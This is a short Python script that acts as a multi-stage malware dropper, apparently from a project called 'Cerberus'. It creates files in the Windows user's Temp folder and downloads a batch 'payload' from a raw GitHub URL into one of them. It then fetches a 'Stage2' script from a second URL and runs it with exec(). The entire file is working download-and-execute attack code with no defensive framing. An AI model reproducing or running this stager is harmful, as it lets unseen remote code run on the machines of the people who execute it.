import os.path
import urllib.request

path = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/Stage2Host.py")   # Path to Stage2Host File
filename = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/PHost.bat") # Path to Payload

# Creates Stage2Host
if os.path.isfile(path) == False: 
    file = open('Stage2Host.py', 'a')
    file.close()

# Creates payload file
if os.path.isfile(filename) == False:
    file = open('PHost.bat', 'a')
    file.close()

with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Payload1.txt") as response:
    data = response.read().decode("utf-8") # Takes code from URL and decodes it to remove useless newline characters in code
    with open(filename, "a+") as fp: fp.write(data) # Opens paylaod in read and write mode and appends code retrieved into it

urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage2.txt", path) # Next Stage

exec(open(path).read()) # Runs Stage 2 File
